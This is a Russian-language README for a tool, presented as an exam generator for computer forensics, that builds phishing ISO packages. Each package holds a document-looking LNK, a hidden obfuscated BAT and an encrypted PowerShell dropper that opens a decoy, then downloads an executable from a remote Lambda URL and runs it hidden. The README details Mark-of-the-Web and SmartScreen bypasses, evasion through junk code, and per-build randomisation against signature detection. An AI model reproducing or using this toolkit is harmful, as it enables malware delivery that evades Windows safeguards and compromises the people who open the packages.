# exam-gen

Автоматический генератор уникальных kill chain пакетов для экзамена по компьютерной криминалистике.

Скрипт принимает папки-варианты с готовыми `.docx` документами и на выходе даёт **два ZIP-архива на каждый вариант**:
- `VariantName.zip` -- Word-версия (ISO с DOCX + kill chain, LNK с иконкой Word)
- `VariantName_pdf.zip` -- PDF-версия (ISO с PDF + kill chain, LNK с иконкой Edge)

Каждый запуск генерирует **полностью уникальные** артефакты:
- Новая карта шифра для каждого пакета (Word и PDF -- разные)
- Новые имена переменных и функций в PS1
- Рандомные имена BAT, PS1, decoy-файлов (2-3 символа, уникальны на каждый пакет)
- Рандомные placeholder-теги (`##xxxx##`) в PS1
- Разные хеши документов в каждом пакете (независимая модификация)

Работает на **Windows** и **Linux**.

## Требования

### Python 3.8+

```bash
pip install -r requirements.txt
```

| Пакет | Назначение |
|-------|------------|
| `python-docx` | Модификация DOCX (невидимый текст для смены хеша) |
| `pycdlib` | Создание ISO-образов с Joliet и hidden-флагами |
| `pylnk3` | Создание Windows-ярлыков (.lnk) |
| `docx2pdf` | Конвертация DOCX -> PDF |

### DOCX -> PDF конвертация

| ОС | Что используется | Установка |
|----|-----------------|-----------|
| **Windows** | Microsoft Word (через COM) | Word должен быть установлен (обычно уже есть) |
| **Linux** | LibreOffice headless | `sudo apt install libreoffice-writer` |

## Быстрый старт

### Windows

```powershell
git clone https://github.com/hungohun48/exam-gen.git
cd exam-gen
pip install -r requirements.txt
copy .env.example .env
# отредактировать .env -- вписать LAMBDA_URL и API_KEY
python generate.py
```

### Linux

```bash
git clone https://github.com/hungohun48/exam-gen.git
cd exam-gen
pip install -r requirements.txt
sudo apt install libreoffice-writer
cp .env.example .env
nano .env   # вписать LAMBDA_URL и API_KEY
python3 generate.py
```

## Конфигурация

Все параметры читаются из **переменных окружения** или файла `.env` рядом со скриптом.

| Переменная | Обязательная | По умолчанию | Описание |
|------------|:---:|---|---|
| `LAMBDA_URL` | да | -- | URL Lambda Function для доставки payload |
| `API_KEY` | да | -- | Значение заголовка `X-Api-Key` |
| `TARGET_FILENAME` | нет | `cat.exe` | Имя скачиваемого файла на стороне жертвы |
| `VARIANTS_DIR` | нет | `./variants` | Путь к папкам вариантов |
| `OUTPUT_DIR` | нет | `./output` | Путь для выходных ZIP-архивов |
| `DELIVERY_METHOD` | нет | `webclient` | Метод доставки payload (см. ниже) |
| `LNK_BYPASS` | нет | _(пусто = off)_ | Обход MOTW-проверки LNK (см. ниже) |
| `JUNK_CODE` | нет | _(пусто = off)_ | Вставка мусорного кода в BAT и PS1 (см. ниже) |

Пример `.env`:

```env
LAMBDA_URL=https://xxx.lambda-url.us-east-1.on.aws/?file=releases%2Fcat.exe
API_KEY=your-api-key-here
TARGET_FILENAME=cat.exe
DELIVERY_METHOD=webclient
LNK_BYPASS=1
JUNK_CODE=1
```

Альтернативно -- через переменные окружения:

**PowerShell (Windows):**

```powershell
$env:LAMBDA_URL="https://..."
$env:API_KEY="..."
$env:DELIVERY_METHOD="base64_recycle"
$env:LNK_BYPASS="1"
$env:JUNK_CODE="1"
python generate.py
```

Однострочник (PowerShell):

```powershell
$env:JUNK_CODE="1"; $env:LNK_BYPASS="1"; $env:DELIVERY_METHOD="base64_recycle"; python generate.py
```

**Bash (Linux / Git Bash):**

```bash
export LAMBDA_URL='https://...'
export API_KEY='...'
export DELIVERY_METHOD='base64_recycle'
export LNK_BYPASS=1
export JUNK_CODE=1
python3 generate.py
```

## Методы доставки (DELIVERY_METHOD)

### `webclient` (по умолчанию)

Классический метод -- скачать файл и запустить.

```
PS1 выполняет:
1. WebClient.DownloadFile(url, path)   -- скачивает файл на диск
2. Start-Process path                  -- запускает
```

**Плюсы:** простой, минимальный код, надёжный.
**Минусы:** `DownloadFile()` автоматически ставит Mark of the Web (Zone.Identifier ADS) на скачанный файл. SmartScreen может заблокировать запуск.

### `base64_recycle` (обход MOTW)

Продвинутый метод -- скачать байты в память, создать файл через base64-декодирование, удалить метку MOTW.

```
PS1 выполняет:
1. WebClient.DownloadData(url)         -- скачивает БАЙТЫ в память (не файл!)
2. [Convert]::ToBase64String(bytes)    -- кодирует байты в base64-строку
3. [Convert]::FromBase64String(b64)    -- декодирует обратно в байты
4. [IO.File]::WriteAllBytes(path, bytes) -- записывает файл через .NET I/O
5. Remove-Item -Stream Zone.Identifier -- удаляет метку MOTW (страховка)
6. Start-Process path                  -- запускает
```

**Как это обходит MOTW -- подробно:**

#### Шаг 1: DownloadData вместо DownloadFile

| | `DownloadFile()` | `DownloadData()` |
|---|---|---|
| Что делает | Скачивает файл и сохраняет на диск | Скачивает данные в `byte[]` в RAM |
| Создаёт файл? | Да, сразу | Нет, только массив байт в памяти |
| MOTW (Zone.Identifier)? | **Да** -- Windows помечает файл как скачанный из интернета | **Нет** -- файла нет, метить нечего |

Ключевой момент: MOTW (Mark of the Web) -- это NTFS Alternate Data Stream (ADS) с именем `Zone.Identifier`. Windows добавляет его **только когда файл создаётся через "скачивание"** (браузер, `DownloadFile`, сохранение из Office и т.д.). Если файл создаётся программно через обычный файловый I/O -- метки нет.

#### Шаг 2: Base64 encode/decode

```
Байты из RAM -> ToBase64String() -> текстовая строка -> FromBase64String() -> байты
```

Это промежуточный слой обфускации. Данные проходят через текстовое представление (base64) и обратно. На диск пока ничего не пишется. В итоге имеем тот же `byte[]`, но через трансформацию.

#### Шаг 3: WriteAllBytes

```csharp
[System.IO.File]::WriteAllBytes("C:\Users\...\cat.exe", $bytes)
```

Это стандартная .NET операция записи файла. Она:
- **НЕ** вызывает URL Security Zone Manager
- **НЕ** добавляет Zone.Identifier ADS
- Просто пишет байты на диск, как если бы файл был создан локально

Для Windows этот файл -- "локальный", не из интернета.

#### Шаг 4: Remove-Item -Stream (страховка)

```powershell
Remove-Item -Path $path -Stream Zone.Identifier -ErrorAction SilentlyContinue
```

На случай если Windows всё-таки пометил файл (например, через zone propagation от процесса PowerShell, который сам мог быть запущен из помеченного скрипта):

- `Zone.Identifier` -- это NTFS ADS (альтернативный поток данных), прикреплённый к файлу
- `Remove-Item -Stream` удаляет **только этот поток**, сам файл не трогает
- `-ErrorAction SilentlyContinue` -- если потока нет (и так чисто), ошибки не будет

После удаления: файл существует, работает, но для Windows он "чистый" -- не из интернета.

#### Шаг 5: Запуск

```powershell
Start-Process -FilePath $path -WindowStyle Hidden
```

SmartScreen проверяет Zone.Identifier при запуске exe. Его нет -> нет предупреждения -> файл запускается.

#### Сравнение методов

| Этап | `webclient` | `base64_recycle` |
|------|-------------|------------------|
| Скачивание | `DownloadFile()` -> файл с MOTW | `DownloadData()` -> байты в RAM |
| Запись на диск | Уже есть (с меткой) | `WriteAllBytes` (без метки) |
| Zone.Identifier | **Есть** | **Удалён / не создан** |
| SmartScreen | Может заблокировать | Не срабатывает |
| Обфускация | Шифр + Base64 (URL) | Шифр + Base64 (URL) + Base64 (payload) |

#### Что такое Zone.Identifier (MOTW)

Когда ты скачиваешь файл через браузер или `DownloadFile`, Windows создаёт скрытый поток данных:

```
cat.exe                     -- основной файл (сам exe)
cat.exe:Zone.Identifier     -- ADS (скрытый поток)
```

Содержимое `Zone.Identifier`:
```ini
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://...
HostUrl=https://...
```

`ZoneId=3` означает "Internet Zone". При запуске exe Windows видит эту метку и показывает предупреждение SmartScreen. Метод `base64_recycle` не создаёт этот поток, а если он случайно появился -- удаляет.

## LNK MOTW Bypass (LNK_BYPASS)

На Windows 11 22H2+ (после патча CVE-2022-41091) при клике на LNK внутри ISO с MOTW появляется "Open File Security Warning". Причина: аргументы LNK используют `start /min .\bat` — команда `start` вызывает `ShellExecuteEx`, который проверяет MOTW на BAT-файле.

### Как включить

```env
LNK_BYPASS=1
```

Любое непустое значение = ON. Пустое или отсутствует = off (старое поведение).

### Что меняется

| | `LNK_BYPASS` off (по умолчанию) | `LNK_BYPASS` on |
|---|---|---|
| LNK arguments | `/c "start /min .\bat"` | `/c ".\bat"` |
| Window style | 1 (SW_SHOWNORMAL) | 7 (SW_SHOWMINNOACTIVE) |
| API для запуска BAT | `ShellExecuteEx` (через `start`) | cmd internal execution |
| MOTW check на BAT | **Да** — SmartScreen проверяет | **Нет** — cmd обрабатывает BAT внутренне |

### Почему это работает

`start` — это команда cmd.exe, которая внутри вызывает `ShellExecuteEx` для запуска целевого файла. `ShellExecuteEx` проверяет Zone.Identifier (MOTW) и показывает предупреждение.

`cmd.exe /c .\bat` — cmd.exe **не** использует ShellExecute для выполнения BAT. Он читает файл и выполняет строки BAT-скрипта внутри своего процесса. Поэтому MOTW-проверка не срабатывает.

`window_style=7` (SW_SHOWMINNOACTIVE) обеспечивает минимизацию окна cmd.exe, так как без `start /min` окно cmd не будет автоматически скрыто.

### Верификация

```powershell
$env:LNK_BYPASS="1"; $env:DELIVERY_METHOD="base64_recycle"; python generate.py
```

Затем: разблокировать ISO (Properties → Unblock) → смонтировать → кликнуть LNK → BAT должен выполниться без "Open File Security Warning".

## Мусорный код (JUNK_CODE)

Вставляет мёртвый (неисполняемый) код в генерируемые BAT и PS1 скрипты для увеличения энтропии и снижения вероятности сигнатурного детекта.

### Как включить

```env
JUNK_CODE=1
```

Любое непустое значение = ON. Пустое или отсутствует = off.

### Что вставляется в BAT

| Тип | Количество | Пример |
|-----|:---:|---------|
| Мёртвые `SET` переменные | 3-6 | `set "xkjf=48291"` |
| `IF DEFINED` с несуществующей переменной | 1-2 | `if defined QXZ goto chkDisk` |
| Мёртвые метки с `GOTO :skip` | 1-2 | `goto :skip_initNet` / `:initNet` / `REM ...` / `:skip_initNet` |

Пример BAT с JUNK_CODE=1:

```batch
@echo off
cd /d "%~dp0"
REM System diagnostic module v3.2.1
set "c=ell"
set "xkjf=48291"
if defined QXZ goto chkDisk
set "a=pow"
goto :skip_initNet
:initNet
REM make time 472
:skip_initNet
set "mwp=a3e8f1"
REM Checking system integrity...
set "b=ersh"
...
start xyz.docx
%a%%b%%c%.exe %d%%e%%f%%g%%h%%i%%j% -File cd.ps1
```

### Что вставляется в PS1

| Тип | Количество | Пример |
|-----|:---:|---------|
| Мёртвые функции | 2-4 | `function Get-ConfigState { param([int]$x = 42831); ... }` |
| Мёртвые переменные | 3-6 | `$NtQueryObjZwAllocMem47 = 0x3a2f` |

**Паттерны функций** (выбираются случайно):

- **XOR-вычисление:** `param([int]$x = N); $var = $x -bxor M; return $var`
- **Hashtable lookup:** `$var = @{'key1'=N; 'key2'=M}; return $var.Keys.Count`
- **String manipulation:** `param([string]$s = '...'); $var = $s.Length -band 0xFF; return $var`

Имена функций в стиле PowerShell cmdlet: `Get-ConfigState`, `Test-CertStore`, `Invoke-BufferSize` и т.д.

Имена переменных в стиле Windows API: `$NtQueryObjZwAllocMem47`, `$RtlInitStrPsGetProc83` и т.д.

### Комбинация с другими опциями

Рекомендуемый набор для максимального обхода:

```powershell
$env:DELIVERY_METHOD="base64_recycle"   # обход MOTW для payload
$env:LNK_BYPASS="1"                     # обход MOTW для LNK->BAT
$env:JUNK_CODE="1"                      # мусорный код для антидетекта
python generate.py
```

## Структура проекта

```
exam-gen/
├── generate.py          # Основной скрипт (единый файл)
├── requirements.txt     # Зависимости Python
├── .env.example         # Шаблон конфигурации
├── .env                 # Твой конфиг (не в git)
├── .gitignore
├── variants/            # ВХОД: папки вариантов с .docx
│   ├── Variant-01/
│   │   ├── doc1.docx
│   │   └── doc2.docx
│   └── Variant-02/
│       └── doc1.docx
└── output/              # ВЫХОД: готовые пакеты
    ├── Variant-01.zip
    ├── Variant-01_pdf.zip
    ├── Variant-02.zip
    └── Variant-02_pdf.zip
```

## Пайплайн генерации (на каждый вариант)

### Шаг 1 -- Копирование DOCX-оригиналов

Каждый `.docx` из папки варианта копируется во временную директорию.

### Шаг 2 -- Сборка Word-пакета

Для Word-пакета генерируются **собственные** уникальные артефакты:

1. Каждый DOCX **независимо** модифицируется -- в конец добавляется невидимый абзац (белый текст, 1pt, 30-80 случайных слов) для смены хеша
2. Первый DOCX переименовывается в рандомное имя (decoy, скрытый)
3. Остальные DOCX остаются видимыми
4. Генерируется **уникальная карта шифра** (83 символа -> 2-символьные коды)
5. Генерируется PS1-дроппер с рандомными переменными и placeholder-тегами
6. Генерируется BAT с обфускацией set-variable fragmentation + junk REM
7. Создаётся LNK с иконкой Word (`SHELL32.dll,1`), target -> `cmd.exe /c "start /min .\{bat}"`
8. Всё пакуется в ISO (Joliet, hidden-флаги на BAT, PS1, decoy)
9. ISO пакуется в `VariantName.zip`

### Шаг 3 -- Сборка PDF-пакета

Для PDF-пакета генерируются **свои** уникальные артефакты (не совпадают с Word):

1. DOCX-оригиналы копируются и **заново** модифицируются (другой невидимый текст, другие хеши)
2. Все DOCX конвертируются в PDF (Word на Windows / LibreOffice на Linux)
3. Первый PDF переименовывается в рандомное имя (decoy, скрытый)
4. Генерируется **новая** карта шифра, PS1, BAT -- полностью отличные от Word-пакета
5. Создаётся LNK с иконкой Edge (`msedge.exe,11`)
6. Пакуется в ISO -> `VariantName_pdf.zip`

## Уникальность пакетов

Каждый пакет (Word и PDF) внутри одного варианта имеет:

| Артефакт | Уникален? |
|----------|:---------:|
| Имена BAT/PS1/decoy файлов | да (рандомные 2-3 символа) |
| Карта шифра PS1 | да (новая генерация) |
| Имена переменных в PS1 | да (из пула слов + суффикс) |
| Placeholder-теги (`##xxxx##`) | да (4-8 рандомных символов) |
| Хеши DOCX/PDF | да (независимая модификация) |
| Содержимое BAT | да (перемешанные SET + REM) |

## Содержимое ISO (вид на Windows)

При монтировании ISO в Windows Explorer с настройками по умолчанию:

| Файл | Видимость | Назначение |
|------|:---------:|------------|
| `Document.lnk` | видимый | Ярлык (выглядит как DOCX/PDF), запускает kill chain |
| `doc2.docx` / `doc2.pdf` | видимый | Дополнительные документы (если есть) |
| `xyz.docx` / `xyz.pdf` | скрытый | Decoy-документ (рандомное имя), открывается при клике на LNK |
| `ab.bat` | скрытый | Обфусцированный BAT (рандомное имя): открывает decoy + запускает PS1 |
| `cd.ps1` | скрытый | Зашифрованный PS1-дроппер (рандомное имя) |

## LNK-ярлык

LNK создаётся без `WorkingDirectory` -- Windows автоматически использует директорию ярлыка (точку монтирования ISO) как рабочую папку. Это обеспечивает корректный запуск BAT при клике на LNK с любого диска.

- Target: `C:\Windows\System32\cmd.exe`
- Arguments (по умолчанию): `/c "start /min .\{bat}"` — BAT запускается через `start /min`
- Arguments (LNK_BYPASS=1): `/c ".\{bat}"` — BAT запускается напрямую через cmd
- ShowCommand: 1 (Normal) или 7 (SW_SHOWMINNOACTIVE при LNK_BYPASS)
- Icon: Word (`SHELL32.dll,1`) или Edge (`msedge.exe,11`)

## Обфускация

### BAT (set-variable fragmentation)

```batch
@echo off
cd /d "%~dp0"
REM Configuration loader v3
set "c=ell"
REM Checking system integrity...
set "a=pow"
set "f= -Ex"
set "b=ersh"
...
start xyz.docx
%a%%b%%c%.exe %d%%e%%f%%g%%h%%i%%j% -File cd.ps1
```

`powershell` собирается из фрагментов через `%a%%b%%c%`, аргументы аналогично. SET-строки перемешаны, между ними вставлены junk REM-комментарии. При `JUNK_CODE=1` дополнительно вставляются мёртвые SET-переменные, IF-GOTO и метки (подробнее в разделе "Мусорный код").

### PS1 (подстановочный шифр + Base64)

```
Слои обфускации:
1. Подстановочный шифр -- тело скрипта (83 уникальных 2-символьных кода)
2. Base64 -- URL и имя файла
3. Рандомные имена переменных -- стиль Windows API / Hex
4. Рандомные placeholder-теги (##xxxx##) для URL и filename
5. Invoke-Expression -- финальное выполнение
6. При JUNK_CODE=1: мёртвые функции и переменные (подробнее в разделе "Мусорный код")
```

## Проверка результатов

```bash
# 1. Запустить генерацию
python3 generate.py

# 2. Проверить выход
ls output/
# Variant-01.zip  Variant-01_pdf.zip  Variant-02.zip  Variant-02_pdf.zip

# 3. Скопировать на Windows -> распаковать ZIP -> смонтировать ISO
# 4. Убедиться:
#    - Видны только LNK + дополнительные документы
#    - Клик по LNK -> открывается decoy + PS1 запускается
#    - PS1 скачивает файл с Lambda -> запускает
# 5. Каждый пакет (Word и PDF) имеет уникальные:
#    - Имена файлов (BAT, PS1, decoy)
#    - Карту шифра и переменные PS1
#    - Placeholder-теги
#    - Хеши документов
```
